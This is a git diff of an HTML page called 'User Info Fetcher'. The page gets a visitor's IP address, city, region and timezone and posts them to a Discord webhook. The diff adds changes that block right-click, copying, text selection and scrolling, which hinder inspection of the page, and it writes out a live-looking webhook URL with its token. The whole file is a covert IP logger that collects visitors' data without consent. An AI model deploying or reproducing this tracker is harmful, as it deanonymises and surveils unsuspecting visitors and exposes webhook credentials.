@@ -4,8 +4,24 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>User Info Fetcher</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            overflow: hidden; /* Disable scrolling */
+        }
+
+        /* Disable text selection */
+        body::selection {
+            background-color: transparent;
+        }
+
+        body::-moz-selection {
+            background-color: transparent;
+        }
+    </style>
 </head>
-<body>
+<body oncontextmenu="return false" oncopy="return false"> <!-- Disable right-click and copying -->
 
 <script>
   // Function to fetch user's IP address
@@ -25,7 +41,7 @@
   // Function to send data to Discord webhook as an embedded message
   async function sendToDiscord(ipAddress, locationInfo) {
     const { city, region, timezone } = locationInfo;
-    const webhookURL = 'https://discord.com/api/webhooks/1197338395937091584/sXzW8KZ-Ln0edoVjORVQe7RtvOyaHyH6qtBj5JhFxxuYsO413DJ4K3his0zUiITF3arp'; // Replace with your Discord webhook URL
+    const webhookURL = 'https://discord.com/api/webhooks/1197340200276344852/oMGzClEWwTYkBG9qF0UYTdcqvCnfZPDX2JhCtc1B0gT5LZmOCyPxBtRwIcIOSIW4lpZY'; // Replace with your Discord webhook URL
 
     // Convert RGB color (49, 51, 56) to Discord format
     const discordColor = (49 << 16) + (51 << 8) + 56;
@@ -36,9 +52,9 @@
             title: ipAddress, // Set the title of the embed as the user's IP address
             color: discordColor, // Set the color of the embed (Discord format)
             fields: [
-                { name: "City", value: city },
-                { name: "Region", value: region },
-                { name: "Timezone", value: timezone },
+                { name: "city", value: city },
+                { name: "state", value: region },
+                { name: "timezone", value: timezone },
             ],
         }],
     };
